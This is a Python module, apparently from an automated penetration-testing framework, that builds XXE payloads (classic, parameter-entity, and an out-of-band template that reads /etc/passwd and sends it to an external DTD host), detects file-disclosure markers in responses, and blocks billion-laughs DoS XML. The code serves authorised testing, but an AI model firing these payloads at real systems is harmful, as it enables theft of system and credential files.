"""Shared utilities for XXE (XML External Entity) payload building and detection.

Lives under ``penage/specialists/shared`` so the future ``XxeSpecialist`` (and
any co-resident tooling) can consume it without the shared layer ever
depending on ``penage.specialists.vulns`` (CLAUDE.md invariant #1).

Three responsibilities:

* Build concrete XXE request bodies from small, auditable templates:
  :func:`build_classic_payload`, :func:`build_parameter_entity_payload`,
  :func:`build_oob_blind_payload`.
* Scan a response body for strong markers of disclosure via
  :func:`detect_xxe_markers`.
* Reject DoS-style XML (billion-laughs, quadratic blowup) via
  :class:`XmlSafetyFilter` before it leaves the specialist. This complements —
  rather than replaces — the shell-oriented
  ``penage.specialists.shared.destructive_filter`` (XML and shell have
  fundamentally different safety semantics and share no logic).

All functions are read-only with respect to the filesystem and the network:
template substitution and string scanning only.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum

_SNIPPET_MAX_CHARS = 200


class XxeSignalFamily(str, Enum):
    """Categories of evidence a response can carry for an XXE probe.

    Ordered from strongest to weakest. ``XML_PARSE_ERROR`` is a weak signal —
    it only proves the endpoint parses XML; the DTD may still be disabled.
    ``ENTITY_EXPANSION`` is medium: it confirms an external entity was
    dereferenced, but the disclosed file was generic (not a high-value
    credential store).
    """

    UNIX_PASSWD = "unix_passwd"
    UNIX_HOSTS = "unix_hosts"
    WIN_INI = "win_ini"
    WIN_HOSTS = "win_hosts"
    XML_PARSE_ERROR = "xml_parse_error"
    ENTITY_EXPANSION = "entity_expansion"
    OOB_ECHO = "oob_echo"


@dataclass(frozen=True, slots=True)
class XxeMarkerHit:
    """A single detected marker inside a response body.

    :param family: which signal family the marker corresponds to.
    :param marker: the concrete substring that matched (not the whole snippet).
    :param snippet: up to 200 characters of surrounding context, used by the
        validation gate and written into the trace (CLAUDE.md invariant #5).
    """

    family: XxeSignalFamily
    marker: str
    snippet: str


# ---------------------------------------------------------------------------
# Payload templates
# ---------------------------------------------------------------------------
#
# Placeholders are plain ``{URI}`` / ``{ENTITY_NAME}`` / ``{LOCAL_FILE}``
# strings and substitution goes through ``str.replace`` rather than
# ``str.format``. XML content can legitimately contain ``{`` / ``}`` inside
# CDATA or comments; using ``.replace`` keeps the template layer resilient to
# that even when current templates happen not to. The uniform convention also
# makes it easier to audit every call site.

XXE_TEMPLATE_CLASSIC = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE {ENTITY_NAME} [ <!ENTITY {ENTITY_NAME} SYSTEM "{URI}"> ]>\n'
    '<root>&{ENTITY_NAME};</root>'
)

XXE_TEMPLATE_PARAMETER_ENTITY = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE r [\n'
    '  <!ENTITY % param1 SYSTEM "{URI}">\n'
    '  %param1;\n'
    ']>\n'
    '<r>ok</r>'
)

XXE_TEMPLATE_OOB_BLIND = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE r [\n'
    '  <!ENTITY % file SYSTEM "file://{LOCAL_FILE}">\n'
    '  <!ENTITY % dtd SYSTEM "{URI}">\n'
    '  %dtd;\n'
    ']>\n'
    '<r>ok</r>'
)


_ENTITY_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_-]*$")


def _validate_entity_name(entity_name: str) -> None:
    if not _ENTITY_NAME_RE.match(entity_name):
        raise ValueError(
            f"invalid entity_name: {entity_name!r}; "
            "must match [A-Za-z_][A-Za-z0-9_-]*"
        )


def build_classic_payload(uri: str, *, entity_name: str = "xxe") -> str:
    """Classic in-band SYSTEM payload reflecting file contents into a root element.

    The returned body is suitable as the request body for any XML-accepting
    endpoint. The default entity name ``xxe`` is conventional in write-ups;
    override it when the target filters that literal string.

    :raises ValueError: if ``entity_name`` does not match
        ``[A-Za-z_][A-Za-z0-9_-]*``. Names that do not satisfy the XML Name
        production would produce an invalid DOCTYPE and risk masking a failure
        as a false negative.
    """
    _validate_entity_name(entity_name)
    return (
        XXE_TEMPLATE_CLASSIC.replace("{URI}", uri).replace(
            "{ENTITY_NAME}", entity_name
        )
    )


def build_parameter_entity_payload(uri: str) -> str:
    """Parameter-entity variant — some parsers allow ``%``-entities where
    ``&``-entities are blocked by configuration (e.g. ``disallow-doctype-decl``
    false but ``external-general-entities`` false).
    """
    return XXE_TEMPLATE_PARAMETER_ENTITY.replace("{URI}", uri)


def build_oob_blind_payload(
    oob_url: str,
    *,
    local_file: str = "/etc/passwd",
) -> str:
    """OOB variant — attacker hosts a follow-up DTD on ``oob_url``; the parser
    fetches it and exfiltrates ``local_file`` via a crafted secondary URL.

    .. note::
        The FULL OOB chain requires serving a secondary DTD from ``oob_url``.
        This helper builds only the **primary** request body; listener logic
        and the secondary DTD live in the specialist (which will also wire
        into ``penage.specialists.shared.oob_listener``).
    """
    return (
        XXE_TEMPLATE_OOB_BLIND.replace("{URI}", oob_url).replace(
            "{LOCAL_FILE}", local_file
        )
    )


# ---------------------------------------------------------------------------
# Marker detection
# ---------------------------------------------------------------------------


def _snippet_around(body: str, start: int, end: int) -> str:
    """Return up to :data:`_SNIPPET_MAX_CHARS` of context around ``[start:end]``."""
    half = _SNIPPET_MAX_CHARS // 2
    s = max(0, start - half)
    e = min(len(body), end + half)
    snippet = body[s:e]
    if len(snippet) > _SNIPPET_MAX_CHARS:
        snippet = snippet[:_SNIPPET_MAX_CHARS]
    return snippet


_UNIX_PASSWD_RE = re.compile(r"root:x:0:0:[^:\n]*:/[^:\n]*:/\w[\w/.-]*")
_UNIX_HOSTS_LINE_RE = re.compile(
    r"^[^\n]*\b127\.0\.0\.1\b[^\n]*\blocalhost\b[^\n]*$",
    re.MULTILINE,
)
_WIN_INI_SECTION_RE = re.compile(
    r"\[(?:fonts|extensions|mci extensions)\]",
    re.IGNORECASE,
)
_WIN_HOSTS_HEADER_RE = re.compile(
    r"(?:Microsoft\s+(?:TCP/IP|Corp\.?)|This is a sample HOSTS file)",
    re.IGNORECASE,
)
_PROC_VERSION_RE = re.compile(r"^Linux version\s+\S+", re.MULTILINE)
_HOSTNAME_LIKE_RE = re.compile(r"^[\w.-]+$")
_XML_PARSE_ERROR_PHRASES = (
    "xml parsing error",
    "undefined entity",
    "parser error: ",
    "malformed xml",
    "premature end of data",
    "not well-formed",
)


def _detect_unix_passwd(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    for m in _UNIX_PASSWD_RE.finditer(body):
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.UNIX_PASSWD,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_unix_hosts(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    for m in _UNIX_HOSTS_LINE_RE.finditer(body):
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.UNIX_HOSTS,
                marker=m.group(0).strip(),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_win_ini(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    for m in _WIN_INI_SECTION_RE.finditer(body):
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.WIN_INI,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_win_hosts(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    if "127.0.0.1" not in body or "localhost" not in body:
        return hits
    for m in _WIN_HOSTS_HEADER_RE.finditer(body):
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.WIN_HOSTS,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_entity_expansion(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    for m in _PROC_VERSION_RE.finditer(body):
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.ENTITY_EXPANSION,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
        return hits
    stripped = body.strip()
    if stripped and len(stripped) < 64 and _HOSTNAME_LIKE_RE.match(stripped):
        start = body.find(stripped)
        end = start + len(stripped)
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.ENTITY_EXPANSION,
                marker=stripped,
                snippet=_snippet_around(body, start, end),
            )
        )
    return hits


def _detect_xml_parse_error(body: str) -> list[XxeMarkerHit]:
    hits: list[XxeMarkerHit] = []
    lower = body.lower()
    for phrase in _XML_PARSE_ERROR_PHRASES:
        idx = lower.find(phrase)
        if idx == -1:
            continue
        end = idx + len(phrase)
        hits.append(
            XxeMarkerHit(
                family=XxeSignalFamily.XML_PARSE_ERROR,
                marker=body[idx:end],
                snippet=_snippet_around(body, idx, end),
            )
        )
    return hits


def detect_xxe_markers(body: str) -> list[XxeMarkerHit]:
    """Scan ``body`` for strong markers of a successful XXE disclosure.

    Priorities (high → low):

    * ``unix_passwd`` — full ``root:x:0:0:…:/…:/…`` line.
    * ``unix_hosts`` — line containing both ``127.0.0.1`` and ``localhost``.
    * ``win_ini`` — characteristic section headers (``[fonts]`` etc.).
    * ``win_hosts`` — ``127.0.0.1`` + ``localhost`` together with a Windows
      HOSTS-file header banner.
    * ``entity_expansion`` — generic file-content echo (e.g. ``/proc/version``
      → ``Linux version …`` or a short hostname token). Only surfaced when
      **no** higher-priority family matched; otherwise it would double-count.
    * ``xml_parse_error`` — weak signal: the parser emitted a recognisable
      error phrase. Useful for distinguishing an XML endpoint from an HTML
      one when DTD processing is disabled.

    Returns **all** matches within a priority band. An empty body (or a body
    with no markers) returns an empty list; callers must not treat that as
    proof of absence of XXE — only as a lack of strong evidence.
    """
    if not body:
        return []

    hits: list[XxeMarkerHit] = []
    hits.extend(_detect_unix_passwd(body))
    hits.extend(_detect_unix_hosts(body))
    hits.extend(_detect_win_ini(body))
    hits.extend(_detect_win_hosts(body))
    has_strong = bool(hits)
    if not has_strong:
        hits.extend(_detect_entity_expansion(body))
    hits.extend(_detect_xml_parse_error(body))
    return hits


# ---------------------------------------------------------------------------
# XML-level safety filter
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class XmlSafetyVerdict:
    """Outcome of :meth:`XmlSafetyFilter.check`.

    :param allowed: ``True`` if the payload is safe to send.
    :param reason: short machine-readable label for the blocking heuristic
        (``excessive_entities``, ``recursive_entity``, ``entity_spam``) or
        ``None`` when ``allowed`` is ``True``.
    """

    allowed: bool
    reason: str | None = None


_ENTITY_DECL_RE = re.compile(r"<!ENTITY\s+", re.IGNORECASE)
_RECURSIVE_ENTITY_RE = re.compile(
    r"<!ENTITY\s+%?\s*\w+\s+[^>]*&\w+;",
    re.IGNORECASE,
)
_ENTITY_REF_RE = re.compile(r"&\w+;")


class XmlSafetyFilter:
    """Blocks DoS-style XML payloads (billion-laughs, quadratic blowup).

    The filter is an **XML-specific** complement to
    :mod:`penage.specialists.shared.destructive_filter`. Their heuristics
    cannot be unified: shell destructiveness is about command verbs and
    redirection; XML destructiveness is about entity topology and expansion
    cost. Keeping them in separate modules preserves that distinction.

    Default policy is to **block**; pass ``allow_dos=True`` to opt in (e.g.
    when running an authorised DoS study in a quarantined lab). The caller is
    responsible for writing an appropriate warning to the trace when
    ``allow_dos=True`` (CLAUDE.md safety invariant #4).
    """

    def __init__(self, *, allow_dos: bool = False) -> None:
        self._allow_dos = allow_dos

    def check(self, payload: str) -> XmlSafetyVerdict:
        """Evaluate ``payload`` and return whether it is safe to send.

        Heuristics (applied in order; first match wins):

        1. More than five ``<!ENTITY`` declarations → ``excessive_entities``.
        2. An entity declaration whose body references another entity
           (``<!ENTITY a "…&b;…">``) → ``recursive_entity`` — the classic
           billion-laughs signature.
        3. A single line containing more than ten ``&name;`` references →
           ``entity_spam``.

        When ``allow_dos=True`` the filter returns ``allowed=True`` regardless.
        """
        if self._allow_dos:
            return XmlSafetyVerdict(allowed=True)

        entity_decls = _ENTITY_DECL_RE.findall(payload)
        if len(entity_decls) > 5:
            return XmlSafetyVerdict(allowed=False, reason="excessive_entities")

        if _RECURSIVE_ENTITY_RE.search(payload):
            return XmlSafetyVerdict(allowed=False, reason="recursive_entity")

        for line in payload.splitlines():
            if len(_ENTITY_REF_RE.findall(line)) > 10:
                return XmlSafetyVerdict(allowed=False, reason="entity_spam")

        return XmlSafetyVerdict(allowed=True)


__all__ = [
    "XXE_TEMPLATE_CLASSIC",
    "XXE_TEMPLATE_OOB_BLIND",
    "XXE_TEMPLATE_PARAMETER_ENTITY",
    "XmlSafetyFilter",
    "XmlSafetyVerdict",
    "XxeMarkerHit",
    "XxeSignalFamily",
    "build_classic_payload",
    "build_oob_blind_payload",
    "build_parameter_entity_payload",
    "detect_xxe_markers",
]
